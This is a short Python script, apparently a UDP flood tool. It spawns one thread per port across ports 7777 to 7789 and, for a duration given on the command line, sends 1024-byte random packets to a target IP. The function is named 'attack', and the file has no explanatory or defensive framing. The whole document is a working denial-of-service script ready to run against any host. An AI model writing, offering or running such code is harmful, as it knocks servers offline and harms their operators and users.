
import socket
import random
import sys
import threading
import time

ip = sys.argv[1]
duration = int(sys.argv[2])


ports = list(range(7777, 7790))

data = random._urandom(1024)

def attack(ip, port, duration):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < timeout:
        try:
            sock.sendto(data, (ip, port))
        except:
            pass

threads = []

for port in ports:
    thread = threading.Thread(target=attack, args=(ip, port, duration))
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()
